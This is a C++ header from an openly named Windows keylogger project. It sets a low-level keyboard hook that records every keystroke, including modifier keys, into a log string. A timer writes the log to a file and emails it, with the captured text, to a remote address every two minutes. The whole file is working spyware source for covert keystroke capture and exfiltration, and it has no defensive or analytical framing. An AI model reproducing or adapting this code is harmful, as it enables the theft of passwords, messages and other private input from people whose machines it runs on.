//
// Created by Samuel on 20/06/2017.
//

#ifndef KEYLOGGER_KEYBHOOK_H
#define KEYLOGGER_KEYBHOOK_H

#include <iostream>
#include <fstream>
#include "windows.h"
#include "KeyConstants.h"
#include "Timer.h"
#include  "SendMail.h"

using namespace std;
using namespace Helper;
using namespace Mail;

string keylog = "";

void TimerSendMail()
{
	if (keylog.empty())
		return;
	string last_file = WriteLog(keylog);

	if(last_file.empty())
	{
		WriteAppLog("File creation was not successful. Keylog '" + keylog + "'");
		return;
	}

	int x = SendMail("Log [" + last_file + "]", "Hi \nThe file has been attatched to this mail" + keylog, GetOurPath(true) + last_file);

	if (x != 7)
		WriteAppLog("Mail was not sent! Error code: " + ToString(x));
	else
		keylog = "";
}

Timer MailTimer(TimerSendMail, 1000 * 120, Timer::Infinite);

HHOOK eHook = NULL;

LRESULT OurKeyboardProc(int nCode, WPARAM wparam, LPARAM lparam)
{
	if(nCode < 0)
		CallNextHookEx(eHook, nCode, wparam, lparam);

	KBDLLHOOKSTRUCT *kbs = (KBDLLHOOKSTRUCT *)lparam;
	if(wparam == WM_KEYDOWN || wparam == WM_SYSKEYDOWN)
	{
		keylog += Keys::KEYS[kbs->vkCode].Name;
		if (kbs->vkCode == VK_RETURN)
			keylog += '\n';
	}

	else if(wparam == WM_KEYUP || wparam == WM_SYSKEYUP)
	{
		DWORD key = kbs->vkCode;
		if(key == VK_CONTROL 
			|| key == VK_LCONTROL 
			|| key == VK_RCONTROL 
			|| key == VK_SHIFT 
			|| key == VK_RSHIFT 
			|| key == VK_LSHIFT 
			|| key == VK_MENU 
			|| key == VK_LMENU 
			|| key == VK_RMENU 
			|| key == VK_CAPITAL 
			|| key == VK_NUMLOCK 
			|| key == VK_LWIN 
			|| key == VK_RWIN
			)
		{
			string KeyName = Keys::KEYS[kbs->vkCode].Name;
			KeyName.insert(1, "/");
			keylog += KeyName;
		}

	}

	return CallNextHookEx(eHook, nCode, wparam, lparam);
}

#endif //KEYLOGGER_KEYBHOOK_H
